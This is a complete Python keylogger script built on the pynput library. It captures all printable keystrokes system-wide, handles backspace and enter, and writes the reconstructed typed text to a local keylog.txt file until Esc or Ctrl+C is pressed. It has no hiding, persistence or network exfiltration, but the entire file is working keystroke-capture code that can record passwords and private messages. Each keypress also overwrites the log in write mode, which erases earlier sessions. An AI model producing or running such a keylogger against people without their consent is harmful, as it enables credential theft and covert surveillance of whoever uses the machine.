from pynput.keyboard import Listener, Key
import os
import datetime

# Ensure logs directory exists
log_dir = "../logs"
os.makedirs(log_dir, exist_ok=True)

# File path for storing key logs
log_file = os.path.join(log_dir, "keylog.txt")

# Add a session separator
with open(log_file, "a") as f:
    f.write("\n\n==============================\n")
    f.write(f"SESSION STARTED: {datetime.datetime.now()}\n")
    f.write("==============================\n\n")

typed_text = []  # Stores the typed characters to handle backspace correctly

def on_press(key):
    """Logs only actual typed characters, properly handling backspace and ignoring special keys."""
    global typed_text

    try:
        if hasattr(key, 'char') and key.char is not None and key.char.isprintable():
            # Normal printable characters
            typed_text.append(key.char)
        elif key == Key.space:
            typed_text.append(" ")
        elif key == Key.enter:
            typed_text.append("\n")
        elif key == Key.backspace and typed_text:
            typed_text.pop()  # Remove last character on backspace
        else:
            return  # Ignore all other special keys

        # Update log file with the current typed text
        with open(log_file, "w") as f:
            f.write("\n\n==============================\n")
            f.write(f"SESSION STARTED: {datetime.datetime.now()}\n")
            f.write("==============================\n\n")
            f.write("".join(typed_text))  # Write updated text without junk keys

    except Exception:
        pass  # Avoid crashes

def on_release(key):
    if key == Key.esc:
        print("[INFO] Keylogger stopped.")
        return False  # Stop the listener

# Start keylogger with proper termination handling
try:
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except KeyboardInterrupt:
    print("[INFO] Keylogger stopped by Ctrl + C")
